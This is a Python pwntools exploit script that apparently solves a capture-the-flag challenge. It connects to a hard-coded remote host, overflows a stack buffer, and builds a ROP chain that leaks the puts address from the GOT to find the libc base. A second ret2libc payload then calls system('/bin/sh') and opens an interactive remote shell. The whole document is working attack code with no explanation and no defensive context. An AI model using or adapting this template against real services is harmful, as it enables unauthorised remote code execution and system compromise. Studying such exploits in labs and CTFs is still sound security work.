from pwn import *

ip = '34.40.105.109'
port = 30396
offset = 88

puts_plt = 0x400560
puts_got = 0x601018
stop_gadget = 0x4005c0
pop_rdi = 0x4007c3      
ret_gadget = 0x4007c4   

libc = ELF('./libc-2.23.so', checksec=False)
context.arch = 'amd64'

p = remote(ip, port)
p.recvuntil(b"friend?\n")

log.info(f"Using puts@got: {hex(puts_got)}")

log.info("Stage 1: Leaking libc address...")

payload = b"A" * offset
payload += p64(pop_rdi)
payload += p64(puts_got)     # Arg1: puts@got
payload += p64(puts_plt)     # Function: puts
payload += p64(stop_gadget)  # Restart main

p.sendline(payload)

try:
    
    data = p.recvline()
    if b"blind" in data: 
        data = p.recvline()

    if data.endswith(b'\n'): data = data[:-1]

    leaked_addr = u64(data.ljust(8, b'\x00'))
    log.success(f"Leaked puts address: {hex(leaked_addr)}")

    libc.address = leaked_addr - libc.symbols['puts']
    log.success(f"Libc Base: {hex(libc.address)}")

except Exception as e:
    log.error(f"Leak failed: {e}")
    exit()

log.info("Stage 2: Popping shell...")

p.recvuntil(b"friend?\n")

bin_sh = next(libc.search(b'/bin/sh'))
system = libc.symbols['system']

payload2 = b"A" * offset

payload2 += p64(ret_gadget)
payload2 += p64(pop_rdi)
payload2 += p64(bin_sh)
payload2 += p64(system)

p.sendline(payload2)

p.interactive()